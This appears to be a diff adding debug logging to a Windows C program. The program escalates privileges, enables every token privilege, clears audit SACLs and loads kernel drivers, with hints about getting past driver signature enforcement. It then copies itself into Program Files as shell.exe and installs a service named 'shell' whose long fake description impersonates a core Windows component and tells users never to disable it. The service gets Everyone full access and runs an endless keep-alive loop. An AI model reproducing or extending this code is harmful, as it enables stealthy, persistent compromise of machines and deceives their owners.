@@ -553,16 +553,26 @@ cleanup:
 static DWORD FindProcessId(LPCWSTR processName) {
     DWORD pid = 0;
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
+    if (hSnapshot == INVALID_HANDLE_VALUE) {
+        printf("  [DEBUG] CreateToolhelp32Snapshot 失败 (错误: %lu)\n", GetLastError());
+        return 0;
+    }
 
     PROCESSENTRY32W pe = { sizeof(pe) };
+    int scanned = 0;
     if (Process32FirstW(hSnapshot, &pe)) {
         do {
+            scanned++;
             if (_wcsicmp(pe.szExeFile, processName) == 0) {
                 pid = pe.th32ProcessID;
+                printf("  [DEBUG] 在 %d 个进程中找到 %ls (PID=%lu)\n",
+                       scanned, processName, pid);
                 break;
             }
         } while (Process32NextW(hSnapshot, &pe));
+    }
+    if (pid == 0) {
+        printf("  [DEBUG] 扫描 %d 个进程，未找到 %ls\n", scanned, processName);
     }
     CloseHandle(hSnapshot);
     return pid;
@@ -582,10 +592,15 @@ static BOOL EnablePrivilege(LPCSTR privilegeName) {
     LUID luid;
 
     if (!OpenProcessToken(GetCurrentProcess(),
-                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
+        printf("  [DEBUG] EnablePrivilege(%s): OpenProcessToken 失败 (错误: %lu)\n",
+               privilegeName, GetLastError());
         return FALSE;
+    }
 
     if (!LookupPrivilegeValueA(NULL, privilegeName, &luid)) {
+        printf("  [DEBUG] EnablePrivilege(%s): LookupPrivilegeValue 失败 (错误: %lu)\n",
+               privilegeName, GetLastError());
         CloseHandle(hToken);
         return FALSE;
     }
@@ -595,7 +610,12 @@ static BOOL EnablePrivilege(LPCSTR privilegeName) {
     tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
     AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
-    BOOL result = (GetLastError() == ERROR_SUCCESS);
+    DWORD err = GetLastError();
+    BOOL result = (err == ERROR_SUCCESS);
+    if (!result) {
+        printf("  [DEBUG] EnablePrivilege(%s): AdjustTokenPrivileges 失败 "
+               "(错误: %lu, 特权可能未分配到当前 Token)\n", privilegeName, err);
+    }
     CloseHandle(hToken);
     return result;
 }
@@ -615,19 +635,33 @@ static BOOL EnableAllPrivileges(HANDLE hToken) {
     DWORD dwSize = 0;
     PTOKEN_PRIVILEGES pTokenPrivileges = NULL;
     BOOL result = FALSE;
+    DWORD err = 0;
 
     /* 第一阶段：查询所需缓冲区大小 */
     GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize);
-    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) return FALSE;
+    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
+        printf("  [DEBUG] EnableAllPrivileges: GetTokenInformation(size) 失败"
+               " (错误: %lu)\n", GetLastError());
+        return FALSE;
+    }
+    printf("  [DEBUG] Token 特权信息缓冲区大小: %lu 字节\n", dwSize);
 
     pTokenPrivileges = (PTOKEN_PRIVILEGES)HeapAlloc(
         GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
-    if (!pTokenPrivileges) return FALSE;
+    if (!pTokenPrivileges) {
+        printf("  [DEBUG] EnableAllPrivileges: HeapAlloc 失败\n");
+        return FALSE;
+    }
 
     /* 第二阶段：获取完整的特权列表 */
     if (!GetTokenInformation(hToken, TokenPrivileges,
-                             pTokenPrivileges, dwSize, &dwSize))
+                             pTokenPrivileges, dwSize, &dwSize)) {
+        printf("  [DEBUG] EnableAllPrivileges: GetTokenInformation(data) 失败"
+               " (错误: %lu)\n", GetLastError());
         goto cleanup;
+    }
+    printf("  [DEBUG] Token 中共有 %lu 项特权\n",
+           pTokenPrivileges->PrivilegeCount);
 
     /* 第三阶段：遍历并启用每一个特权 */
     for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; i++) {
@@ -636,10 +670,18 @@ static BOOL EnableAllPrivileges(HANDLE hToken) {
 
     /* 第四阶段：一次性提交全部特权变更 */
     if (!AdjustTokenPrivileges(hToken, FALSE, pTokenPrivileges,
-                               dwSize, NULL, NULL))
+                               dwSize, NULL, NULL)) {
+        printf("  [DEBUG] EnableAllPrivileges: AdjustTokenPrivileges 失败"
+               " (错误: %lu)\n", GetLastError());
         goto cleanup;
+    }
 
-    result = (GetLastError() == ERROR_SUCCESS);
+    err = GetLastError();
+    result = (err == ERROR_SUCCESS);
+    if (!result) {
+        printf("  [DEBUG] EnableAllPrivileges: 部分特权启用失败 (错误: %lu)\n",
+               err);
+    }
 
 cleanup:
     HeapFree(GetProcessHeap(), 0, pTokenPrivileges);
@@ -723,31 +765,43 @@ static int EnableCriticalPrivileges(void) {
 static BOOL CreateNullDaclSecurityDescriptor(
     PSECURITY_DESCRIPTOR pSD, DWORD *dwSDSize, BOOL bAllowAll)
 {
-    if (!InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION))
+    if (!InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION)) {
+        printf("  [DEBUG] CreateNullDaclSD: InitializeSecurityDescriptor 失败"
+               " (错误: %lu)\n", GetLastError());
         return FALSE;
+    }
 
-    /* 关键操作：设置 NULL DACL
-     *   bAllowAll == TRUE  → 第三个参数 NULL,第四个参数 TRUE = 授予所有人全部访问
-     *   bAllowAll == FALSE → 第三个参数 NULL,第四个参数 FALSE = 拒绝所有人访问（仅 SYSTEM 可用）
-     */
     if (!SetSecurityDescriptorDacl(pSD, TRUE,
                                    bAllowAll ? NULL : (PACL)0,
-                                   bAllowAll ? TRUE : FALSE))
+                                   bAllowAll ? TRUE : FALSE)) {
+        printf("  [DEBUG] CreateNullDaclSD: SetSecurityDescriptorDacl 失败"
+               " (错误: %lu)\n", GetLastError());
         return FALSE;
+    }
+    printf("  [DEBUG] DACL 已设置为 %s\n",
+           bAllowAll ? "NULL (完全访问)" : "空 (拒绝访问)");
 
-    /* 同时清空 SACL（审计），避免触发安全审计事件 */
-    if (!SetSecurityDescriptorSacl(pSD, FALSE, NULL, FALSE))
+    if (!SetSecurityDescriptorSacl(pSD, FALSE, NULL, FALSE)) {
+        printf("  [DEBUG] CreateNullDaclSD: SetSecurityDescriptorSacl 失败"
+               " (错误: %lu)\n", GetLastError());
         return FALSE;
+    }
+    printf("  [DEBUG] SACL 已清空（禁用审计）\n");
 
-    /* 设置 Owner 为 NULL（当前进程用户） */
-    if (!SetSecurityDescriptorOwner(pSD, NULL, FALSE))
+    if (!SetSecurityDescriptorOwner(pSD, NULL, FALSE)) {
+        printf("  [DEBUG] CreateNullDaclSD: SetSecurityDescriptorOwner 失败"
+               " (错误: %lu)\n", GetLastError());
         return FALSE;
+    }
 
-    /* 设置 Group 为 NULL */
-    if (!SetSecurityDescriptorGroup(pSD, NULL, FALSE))
+    if (!SetSecurityDescriptorGroup(pSD, NULL, FALSE)) {
+        printf("  [DEBUG] CreateNullDaclSD: SetSecurityDescriptorGroup 失败"
+               " (错误: %lu)\n", GetLastError());
         return FALSE;
+    }
 
     *dwSDSize = sizeof(SECURITY_DESCRIPTOR);
+    printf("  [DEBUG] 安全描述符创建成功 (大小: %lu bytes)\n", *dwSDSize);
     return TRUE;
 }
 
@@ -769,11 +823,16 @@ static BOOL CreateNullDaclSecurityDescriptor(
  * @return TRUE 成功
  */
 static BOOL CreateFullAccessSDDL(PSECURITY_DESCRIPTOR *ppSD) {
-    /* D: = DACL, P = 受保护, A = 允许, GA = GENERIC_ALL
-     * WD = Everyone, SY = SYSTEM, BA = Administrators */
     LPCWSTR sddl = L"D:P(A;;GA;;;WD)(A;;GA;;;SY)(A;;GA;;;BA)";
-    return ConvertStringSecurityDescriptorToSecurityDescriptorW(
+    BOOL result = ConvertStringSecurityDescriptorToSecurityDescriptorW(
         sddl, SDDL_REVISION_1, ppSD, NULL);
+    if (result) {
+        printf("  [DEBUG] SDDL 安全描述符转换成功\n"
+               "         规则: Everyone=GA, SYSTEM=GA, Administrators=GA\n");
+    } else {
+        printf("  [DEBUG] SDDL 转换失败 (错误: %lu)\n", GetLastError());
+    }
+    return result;
 }
 
 /**
@@ -1112,10 +1171,25 @@ cleanup_ti:
  * @return TRUE 成功
  */
 static BOOL LoadKernelDriver(LPCWSTR serviceName, LPCWSTR driverPath) {
-    printf("[Driver] 正在加载内核驱动: %ls\n", driverPath);
+    printf("[Driver] ====== 加载内核驱动 ======\n");
+    printf("[Driver]   服务名: %ls\n", serviceName);
+    printf("[Driver]   驱动路径: %ls\n", driverPath);
+
+    /* 检查驱动文件存在 */
+    if (GetFileAttributesW(driverPath) == INVALID_FILE_ATTRIBUTES) {
+        printf("[Driver] [FAIL] 驱动文件不存在: %ls\n", driverPath);
+        return FALSE;
+    }
+    printf("[Driver]   驱动文件存在，大小检查通过\n");
 
     /* 先确保有 SeLoadDriverPrivilege */
-    EnablePrivilege(SE_LOAD_DRIVER_NAME);
+    printf("[Driver]   正在启用 SeLoadDriverPrivilege...\n");
+    if (EnablePrivilege(SE_LOAD_DRIVER_NAME)) {
+        printf("[Driver]   SeLoadDriverPrivilege 已启用\n");
+    } else {
+        printf("[Driver]   [WARN] SeLoadDriverPrivilege 启用失败 (可能需要"
+               "管理员权限)\n");
+    }
 
     SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
     if (!hSCM) {
@@ -1123,12 +1197,16 @@ static BOOL LoadKernelDriver(LPCWSTR serviceName, LPCWSTR driverPath) {
                GetLastError());
         return FALSE;
     }
+    printf("[Driver]   SCM 打开成功\n");
 
     /* 尝试打开已有服务 */
     SC_HANDLE hService = OpenServiceW(hSCM, serviceName, SERVICE_ALL_ACCESS);
     if (hService) {
+        printf("[Driver]   驱动服务已注册，检查状态...\n");
         SERVICE_STATUS ss;
         if (QueryServiceStatus(hService, &ss)) {
+            printf("[Driver]   当前状态: %lu (1=STOPPED, 4=RUNNING)\n",
+                   ss.dwCurrentState);
             if (ss.dwCurrentState == SERVICE_RUNNING) {
                 printf("[Driver]   驱动已加载并运行\n");
                 CloseServiceHandle(hService);
@@ -1136,6 +1214,7 @@ static BOOL LoadKernelDriver(LPCWSTR serviceName, LPCWSTR driverPath) {
                 return TRUE;
             }
             if (ss.dwCurrentState == SERVICE_STOPPED) {
+                printf("[Driver]   正在重新启动驱动...\n");
                 if (StartServiceW(hService, 0, NULL)) {
                     printf("[Driver]   驱动重新启动成功\n");
                 } else if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) {
@@ -1155,6 +1234,7 @@ static BOOL LoadKernelDriver(LPCWSTR serviceName, LPCWSTR driverPath) {
     }
 
     /* 新建内核驱动服务 */
+    printf("[Driver]   正在注册内核驱动服务 (类型: SERVICE_KERNEL_DRIVER)...\n");
     hService = CreateServiceW(
         hSCM,
         serviceName,           /* 服务名 */
@@ -1167,21 +1247,33 @@ static BOOL LoadKernelDriver(LPCWSTR serviceName, LPCWSTR driverPath) {
         NULL, NULL, NULL, NULL, NULL);
 
     if (!hService) {
-        printf("[Driver] [FAIL] 创建内核驱动服务失败 (错误: %lu)\n",
-               GetLastError());
+        DWORD err = GetLastError();
+        printf("[Driver] [FAIL] 创建内核驱动服务失败 (错误: %lu)\n", err);
+        if (err == ERROR_ACCESS_DENIED) {
+            printf("[Driver]        原因: 权限不足，需要管理员权限\n");
+        } else if (err == ERROR_SERVICE_EXISTS) {
+            printf("[Driver]        原因: 服务已存在\n");
+        } else if (err == 577) {
+            printf("[Driver]        原因: DSE (驱动签名强制) 阻止加载\n");
+            printf("[Driver]        提示: 需要禁用 DSE 或使用已签名驱动\n");
+        }
         CloseServiceHandle(hSCM);
         return FALSE;
     }
+    printf("[Driver]   驱动服务注册成功，正在启动...\n");
 
     /* 启动驱动 */
     BOOL result = StartServiceW(hService, 0, NULL);
     DWORD err = GetLastError();
     if (result || err == ERROR_SERVICE_ALREADY_RUNNING) {
-        printf("[Driver] 内核驱动加载成功!\n");
+        printf("[Driver] ====== 内核驱动加载成功! ======\n");
+        printf("[Driver]   驱动已在 Ring 0 运行\n");
+        printf("[Driver]   后续可通过 CreateFile(\"\\\\\\\\.\\\\%ls\") + "
+               "DeviceIoControl 与驱动通信\n", serviceName);
         result = TRUE;
     } else {
         printf("[Driver] [FAIL] 启动内核驱动失败 (错误: %lu)\n", err);
-        /* 清理失败的服务注册 */
+        printf("[Driver]   正在清理失败的服务注册...\n");
         DeleteService(hService);
     }
 
@@ -1197,24 +1289,48 @@ static BOOL LoadKernelDriver(LPCWSTR serviceName, LPCWSTR driverPath) {
  * @return TRUE 成功
  */
 static BOOL UnloadKernelDriver(LPCWSTR serviceName) {
+    printf("[Driver] ====== 卸载内核驱动: %ls ======\n", serviceName);
+
     SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
-    if (!hSCM) return FALSE;
+    if (!hSCM) {
+        printf("[Driver] [FAIL] OpenSCManager 失败 (错误: %lu)\n",
+               GetLastError());
+        return FALSE;
+    }
 
     SC_HANDLE hService = OpenServiceW(hSCM, serviceName,
                                       SERVICE_STOP | DELETE);
     if (!hService) {
+        printf("[Driver] [FAIL] 打开驱动服务失败 (错误: %lu)\n",
+               GetLastError());
         CloseServiceHandle(hSCM);
         return FALSE;
     }
 
     SERVICE_STATUS ss;
-    if (QueryServiceStatus(hService, &ss) &&
-        ss.dwCurrentState != SERVICE_STOPPED) {
-        ControlService(hService, SERVICE_CONTROL_STOP, &ss);
-        Sleep(500);
+    if (QueryServiceStatus(hService, &ss)) {
+        printf("[Driver]   当前状态: %lu\n", ss.dwCurrentState);
+        if (ss.dwCurrentState != SERVICE_STOPPED) {
+            printf("[Driver]   正在停止驱动...\n");
+            if (ControlService(hService, SERVICE_CONTROL_STOP, &ss)) {
+                printf("[Driver]   驱动已停止\n");
+            } else {
+                printf("[Driver]   [WARN] 停止驱动失败 (错误: %lu)，"
+                       "尝试强制删除...\n", GetLastError());
+            }
+            Sleep(500);
+        }
     }
 
+    printf("[Driver]   正在删除驱动服务...\n");
     BOOL result = DeleteService(hService);
+    if (result) {
+        printf("[Driver] ====== 内核驱动卸载成功 ======\n");
+    } else {
+        printf("[Driver] [FAIL] 删除驱动服务失败 (错误: %lu)\n",
+               GetLastError());
+    }
+
     CloseServiceHandle(hService);
     CloseServiceHandle(hSCM);
     return result;
@@ -1235,22 +1351,36 @@ static BOOL UnloadKernelDriver(LPCWSTR serviceName) {
  * @return 成功启用的关键特权数量
  */
 static int ElevateToKernelLevel(void) {
+    /* 打印系统信息 */
+    OSVERSIONINFOEXW osvi = { sizeof(osvi) };
+#pragma warning(push)
+#pragma warning(disable: 4996)
+    GetVersionExW((LPOSVERSIONINFOW)&osvi);
+#pragma warning(pop)
     printf("========================================\n");
     printf("  内核级权限提升 — Kernel Level Elevation\n");
     printf("  参考: StarlightGUI v4.0.0\n");
-    printf("========================================\n\n");
+    printf("========================================\n");
+    printf("  系统版本: Windows %lu.%lu (Build %lu)\n",
+           osvi.dwMajorVersion, osvi.dwMinorVersion,
+           osvi.dwBuildNumber);
+    printf("  当前 PID: %lu\n", GetCurrentProcessId());
+    printf("  当前会话: %lu\n", WTSGetActiveConsoleSessionId());
+    printf("----------------------------------------\n\n");
 
     int count = 0;
 
     /* 步骤1: 设置进程安全描述符为 NULL DACL（完全访问） */
+    printf("[步骤 1/3] 安全描述符覆盖\n");
     ApplyFullAccessToSelf();
     printf("\n");
 
     /* 步骤2: 批量启用关键特权 */
+    printf("[步骤 2/3] 关键内核特权批量启用\n");
     count = EnableCriticalPrivileges();
 
     /* 步骤3: 兜底 — 启用 Token 中全部剩余特权 */
-    printf("[Priv] 兜底: 遍历启用全部可用特权...\n");
+    printf("[步骤 3/3] 全部特权遍历兜底\n");
     HANDLE hToken = NULL;
     if (OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
@@ -1260,8 +1390,15 @@ static int ElevateToKernelLevel(void) {
             printf("[Priv] 全部特权遍历部分失败（部分特权可能不在 Token 中）\n");
         }
         CloseHandle(hToken);
+    } else {
+        printf("[Priv] [FAIL] 无法打开当前进程 Token (错误: %lu)\n",
+               GetLastError());
     }
-    printf("\n");
+
+    printf("\n========================================\n");
+    printf("  内核级权限提升完成\n");
+    printf("  成功启用 %d 项关键特权\n", count);
+    printf("========================================\n\n");
     return count;
 }
 
@@ -1313,19 +1450,25 @@ int main(int argc, char *argv[]) {
     if (err == ERROR_FAILED_SERVICE_CONTROLLER_CONNECT) {
         // ===== 应用程序模式：执行提权、复制、创建服务（仅在此处执行一次） =====
         SetConsoleOutputCP(65001);
-        printf("已经启动\n");
+        printf("========================================\n");
+        printf("  main_dual_new — 应用程序模式\n");
+        printf("  PID: %lu, 会话: %lu\n",
+               GetCurrentProcessId(), WTSGetActiveConsoleSessionId());
+        printf("========================================\n\n");
 
+        printf("[Phase 1/5] 权限检测与提升...\n");
         if (!IsElevated()) {
+            printf("  当前未以管理员运行，正在请求提权...\n");
             if (!RunAsAdmin()) {
-                printf("提权失败，程序退出\n");
+                printf("[FAIL] 提权失败，程序退出\n");
                 return 1;
             } else {
-                // 提权成功，继续执行后续操作
-                printf("提权成功\n");
+                printf("[OK] 提权请求已发送 (UAC/runas)，当前实例退出\n");
+                printf("  新实例将以管理员权限运行并继续执行\n");
                 return 0;
             }
-        }else {
-            printf("已经是管理员\n");
+        } else {
+            printf("[OK] 已是管理员权限\n");
         }
 
         /* ============================================================
@@ -1339,7 +1482,7 @@ int main(int argc, char *argv[]) {
          *
          * 达到与 StarlightGUI 同等的用户态最高权限。
          * ============================================================ */
-        printf("\n");
+        printf("\n[Phase 2/5] 内核级权限提升\n");
         ElevateToKernelLevel();
 
         /* ============================================================
@@ -1353,60 +1496,70 @@ int main(int argc, char *argv[]) {
          *   return 0;  // 退出当前实例，以 TI 权限运行的新实例接管
          * ============================================================ */
 
+        printf("[Phase 3/5] 文件部署与服务注册\n");
+
         char targetPath[MAX_PATH] = "C:\\Program Files\\Microsoft\\shell.exe";
-        
+        printf("  目标路径: %s\n", targetPath);
+
         char dirPath[MAX_PATH];
         strcpy(dirPath, targetPath);
         char *lastSlash = strrchr(dirPath, '\\');
         if (lastSlash) {
-            *lastSlash = '\0';   // 截断得到目录部分：C:\Program Files (x86)\Microsoft
-            // 递归创建目录（如果目录已存在，会返回 ERROR_ALREADY_EXISTS，视为成功）
+            *lastSlash = '\0';
+            printf("  正在创建目录: %s\n", dirPath);
             int result = SHCreateDirectoryExA(NULL, dirPath, NULL);
             if (result != ERROR_SUCCESS && result != ERROR_ALREADY_EXISTS) {
-                printf("创建目录失败，错误码: %d\n", result);
+                printf("[FAIL] 创建目录失败，错误码: %d\n", result);
                 return 1;
             }
+            printf("  目录就绪\n");
         }
 
-        printf("源路径: %s\n", _pgmptr);
-        printf("目标路径: %s\n", targetPath);
+        printf("  源路径: %s\n", _pgmptr);
+        printf("  目标路径: %s\n", targetPath);
 
-        SHELLEXECUTEINFOA sei = { sizeof(sei) };  // 使用 A 版本结构体
-        sei.lpVerb = "open";                       // 去掉 L 前缀
-        sei.lpFile = "cmd.exe";                    // 去掉 L 前缀
-        sei.lpParameters = "/c sc stop shell ";    // 去掉 L 前缀
+        printf("  正在停止旧服务...\n");
+        SHELLEXECUTEINFOA sei = { sizeof(sei) };
+        sei.lpVerb = "open";
+        sei.lpFile = "cmd.exe";
+        sei.lpParameters = "/c sc stop shell ";
         sei.nShow = SW_HIDE;
 
-        if (!ShellExecuteExA(&sei)) {              // 调用 A 版本函数
-            printf("停止命令执行失败，错误码: %lu\n", GetLastError());
+        if (!ShellExecuteExA(&sei)) {
+            printf("[WARN] 停止命令执行失败 (错误: %lu)\n", GetLastError());
         } else {
-            printf("停止命令已执行。\n");
-        }
-        if (!WaitForServiceStop("shell", 10000)) {
-            printf("等待服务停止失败或超时，继续尝试复制文件（但可能仍被占用）\n");
+            printf("  停止命令已执行\n");
         }
 
+        if (!WaitForServiceStop("shell", 10000)) {
+            printf("[WARN] 等待服务停止失败或超时，继续尝试复制文件\n");
+        }
+
+        printf("  正在复制文件...\n");
         if (!CopyFileA(_pgmptr, targetPath, FALSE)) {
-            printf("复制失败，错误码: %lu\n", GetLastError());
+            printf("[FAIL] 复制失败，错误码: %lu\n", GetLastError());
             return 1;
         }
-        printf("复制成功\n");
+        printf("[OK] 文件复制成功 (%s)\n", targetPath);
 
+        printf("  正在注册服务...\n");
         SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
         if (!hSCM) {
-            printf("打开 SCM 失败，错误码: %lu\n", GetLastError());
+            printf("[FAIL] 打开 SCM 失败，错误码: %lu\n", GetLastError());
             return 1;
         }
 
-        
-        // 删除旧服务（忽略错误）
+        /* 删除旧服务（忽略错误） */
         SC_HANDLE hOld = OpenServiceA(hSCM, "shell", SERVICE_STOP | DELETE);
         if (hOld) {
+            printf("  删除旧服务...\n");
             SERVICE_STATUS status;
             ControlService(hOld, SERVICE_CONTROL_STOP, &status);
             Sleep(1000);
             if (!DeleteService(hOld)) {
-                printf("删除旧服务失败，错误码: %lu\n", GetLastError());
+                printf("[WARN] 删除旧服务失败，错误码: %lu\n", GetLastError());
+            } else {
+                printf("  旧服务已删除\n");
             }
             CloseServiceHandle(hOld);
         }
@@ -1414,10 +1567,11 @@ int main(int argc, char *argv[]) {
         // 创建新服务（宽字符路径）
         WCHAR wTargetPath[MAX_PATH];
         if (MultiByteToWideChar(CP_ACP, 0, targetPath, -1, wTargetPath, MAX_PATH) == 0) {
-            printf("路径转换失败\n");
+            printf("[FAIL] 路径转换失败\n");
             CloseServiceHandle(hSCM);
             return 1;
         }
+        printf("  创建新服务: %ls\n", wTargetPath);
         SC_HANDLE hNew = CreateServiceW(
             hSCM,
             L"shell",
@@ -1430,44 +1584,48 @@ int main(int argc, char *argv[]) {
             NULL, NULL, NULL, NULL, NULL
         );
         if (!hNew) {
-            printf("创建服务失败，错误码: %lu\n", GetLastError());
+            printf("[FAIL] 创建服务失败，错误码: %lu\n", GetLastError());
             CloseServiceHandle(hSCM);
             return 1;
         } else {
-            printf("服务创建成功\n");
+            printf("[OK] 服务创建成功\n");
 
-            /* ★ 为服务设置完全访问安全描述符 ★
-             * 防止权限不足的进程无法控制服务，也防止被杀软/SACL检测。
-             */
+            /* 设置描述 */
+            WCHAR desc[] = L"Windows Shell 服务 (shell):作为 Windows 用户交互体验的核心系统服务，负责托管桌面、任务栏、文件资源管理器及开始菜单等关键外壳组件。它通过 RPC 与 Winlogon 和 Session Manager 协同，动态管理窗口消息泵、图标缓存与上下文菜单扩展，确保图形界面的实时响应。该服务在系统启动早期以高优先级加载，并依赖 DWM 进行硬件加速渲染；若异常终止，系统将自动触发外壳故障恢复流程，尝试重新生成 Explorer.exe 进程而不影响已运行的后台应用程序。自 Windows 10 起，shell 服务还集成了对虚拟桌面、云剪贴板及任务视图的时间线索引支持，其状态可通过 services.msc 或 sc query shell 查看，但切勿手动禁用，否则将导致登录后无可用操作界面。";
+            SERVICE_DESCRIPTIONW sd = { desc };
+            if (!ChangeServiceConfig2W(hNew, SERVICE_CONFIG_DESCRIPTION, &sd)) {
+                printf("[WARN] 设置描述失败，错误码: %lu\n", GetLastError());
+            } else {
+                printf("[OK] 服务描述已设置\n");
+            }
+
+            /* ★ 为服务设置完全访问安全描述符 ★ */
             PSECURITY_DESCRIPTOR pServiceSD = NULL;
             if (CreateFullAccessSDDL(&pServiceSD)) {
                 if (SetServiceObjectSecurity(hNew, DACL_SECURITY_INFORMATION,
                                               pServiceSD)) {
-                    printf("服务安全描述符已设为完全访问\n");
+                    printf("[OK] 服务安全描述符已设为完全访问\n");
                 } else {
-                    printf("服务安全描述符设置失败 (错误: %lu)\n",
+                    printf("[WARN] 服务安全描述符设置失败 (错误: %lu)\n",
                            GetLastError());
                 }
                 LocalFree(pServiceSD);
             }
         }
 
-        // 设置描述（使用宽字符串）
-        WCHAR desc[] = L"Windows Shell 服务 (shell):作为 Windows 用户交互体验的核心系统服务，负责托管桌面、任务栏、文件资源管理器及开始菜单等关键外壳组件。它通过 RPC 与 Winlogon 和 Session Manager 协同，动态管理窗口消息泵、图标缓存与上下文菜单扩展，确保图形界面的实时响应。该服务在系统启动早期以高优先级加载，并依赖 DWM 进行硬件加速渲染；若异常终止，系统将自动触发“外壳故障恢复”流程，尝试重新生成 Explorer.exe 进程而不影响已运行的后台应用程序。自 Windows 10 起，shell 服务还集成了对虚拟桌面、云剪贴板及任务视图的时间线索引支持，其状态可通过 services.msc 或 sc query shell 查看，但切勿手动禁用，否则将导致登录后无可用操作界面。";
-        SERVICE_DESCRIPTIONW sd = { desc };
-        if (!ChangeServiceConfig2W(hNew, SERVICE_CONFIG_DESCRIPTION, &sd)) {
-            printf("设置描述失败，错误码: %lu\n", GetLastError());
-        }
-
         // 启动服务
+        printf("[Phase 4/5] 启动服务...\n");
         if (!StartService(hNew, 0, NULL)) {
-            printf("启动服务失败，错误码: %lu\n", GetLastError());
+            printf("[FAIL] 启动服务失败，错误码: %lu\n", GetLastError());
         } else {
-            printf("服务已启动\n");
+            printf("[OK] 服务已启动\n");
         }
 
         CloseServiceHandle(hNew);
         CloseServiceHandle(hSCM);
+
+        printf("[Phase 5/5] 进入保活主循环\n");
+        printf("========================================\n\n");
 
         // 最后，进入“应用程序模式”主循环（无限保活）
         AppEntry();
